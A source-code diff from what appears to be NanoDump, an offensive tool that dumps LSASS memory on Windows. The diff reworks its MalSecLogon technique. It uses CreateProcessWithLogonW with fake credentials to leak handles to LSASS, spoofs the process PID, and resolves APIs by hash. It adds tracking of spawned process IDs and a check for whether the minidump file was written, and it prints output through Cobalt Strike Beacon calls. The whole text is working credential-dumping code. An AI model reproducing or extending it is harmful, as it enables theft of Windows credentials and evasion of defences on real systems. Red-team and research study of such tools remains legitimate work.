@@ -1,4 +1,5 @@
 #include "../include/malseclogon.h"
+#include "../include/handle.h"
 
 PHANDLE_LIST find_process_handles_in_lsass(
     DWORD lsass_pid
@@ -105,13 +106,57 @@ void set_command_line(
     wcsncat(command_line, L" --stage2", MAX_PATH);
 }
 
+BOOL save_new_process_pid(PPROCESS_LIST process_list, DWORD pid)
+{
+    if (!process_list)
+        return TRUE;
+
+    if (process_list->Count + 1 > MAX_PROCESSES)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Too many processes, please increase MAX_PROCESSES\n"
+        );
+        return FALSE;
+    }
+    process_list->ProcessId[process_list->Count++] = pid;
+    return TRUE;
+}
+
+// wait until the process exits and check if the dumpfile exists
+BOOL check_if_succeded(DWORD pid, LPCSTR dump_name)
+{
+    // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
+    HANDLE hSpoofedProcess = get_process_handle(
+        pid,
+        SYNCHRONIZE,
+        FALSE
+    );
+    if (!hSpoofedProcess)
+        return FALSE;
+
+    BOOL success = wait_for_process(hSpoofedProcess);
+    if (!success)
+        return FALSE;
+
+    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
+    if (!file_exists(dump_name))
+        return FALSE;
+
+    return TRUE;
+}
+
 BOOL seclogon_stage_1(
     LPCSTR program_name,
     LPCSTR dump_name,
     BOOL fork,
     BOOL valid,
-    BOOL dup,
-    DWORD lsass_pid
+    BOOL use_seclogon_locally,
+    DWORD lsass_pid,
+    PPROCESS_LIST process_list
 )
 {
     BOOL success;
@@ -165,12 +210,12 @@ BOOL seclogon_stage_1(
     mbstowcs(filename, program_name, MAX_PATH);
 
     // find the address of CreateProcessWithLogonW dynamically
-    CREATEPROCESSWITHLOGONW pCreateProcessWithLogonW;
-    pCreateProcessWithLogonW = (CREATEPROCESSWITHLOGONW)GetFunctionAddress(
+    CREATEPROCESSWITHLOGONW CreateProcessWithLogonW;
+    CreateProcessWithLogonW = (CREATEPROCESSWITHLOGONW)GetFunctionAddress(
         GetLibraryAddress(ADVAPI32),
         CreateProcessWithLogonW_SW2_HASH
     );
-    if (!pCreateProcessWithLogonW)
+    if (!CreateProcessWithLogonW)
     {
 #ifdef DEBUG
 #ifdef BOF
@@ -181,6 +226,7 @@ BOOL seclogon_stage_1(
             "Address of 'CreateProcessWithLogonW' not found\n"
         );
 #endif
+        intFree(handle_list); handle_list = NULL;
         return FALSE;
     }
 
@@ -199,7 +245,7 @@ BOOL seclogon_stage_1(
         if (handle_list->Count > handles_leaked)
             startInfo.hStdError = handle_list->Handle[handles_leaked++];
 
-        success = pCreateProcessWithLogonW(
+        success = CreateProcessWithLogonW(
             L"NanoDumpUser",
             L"NanoDumpDomain",
             L"NanoDumpPwd",
@@ -219,49 +265,38 @@ BOOL seclogon_stage_1(
             intFree(handle_list); handle_list = NULL;
             return FALSE;
         }
-        if (dup)
-        {
-            /*
-             * --seclogon was used together with --dup
-             * once the process was created,
-             * return and duplicate the handle
-             */
-            // sleep 5 seconds to let LSASS process the new (fake) credentials
-            Sleep(5000);
-            // TODO: check that the 3 handles we leaked are actually valid
-            return TRUE;
-        }
-        // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
-        HANDLE hSpoofedProcess = get_process_handle(
-            procInfo.dwProcessId,
-            SYNCHRONIZE,
-            FALSE
-        );
-        if (!hSpoofedProcess)
-        {
-            change_pid(original_pid, NULL);
-            intFree(handle_list); handle_list = NULL;
-            return FALSE;
-        }
-        success = wait_for_process(hSpoofedProcess);
+
+        // save the PID of the newly created process
+        success = save_new_process_pid(process_list, procInfo.dwProcessId);
         if (!success)
         {
             change_pid(original_pid, NULL);
             intFree(handle_list); handle_list = NULL;
             return FALSE;
         }
-        NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
-        if (file_exists(dump_name))
+
+        // if MalSecLogon was used against nanodump, check if the minidump was created
+        if (use_seclogon_locally)
         {
-            change_pid(original_pid, NULL);
-            intFree(handle_list); handle_list = NULL;
-            return TRUE;
+            success = check_if_succeded(
+                procInfo.dwProcessId,
+                dump_name
+            );
+            if (success)
+            {
+                change_pid(original_pid, NULL);
+                intFree(handle_list); handle_list = NULL;
+                return TRUE;
+            }
         }
     }
     // restore the original PID
     change_pid(original_pid, NULL);
     intFree(handle_list); handle_list = NULL;
-    return FALSE;
+    if (use_seclogon_locally)
+        return FALSE;
+    else
+        return TRUE;
 }
 
 #ifndef BOF
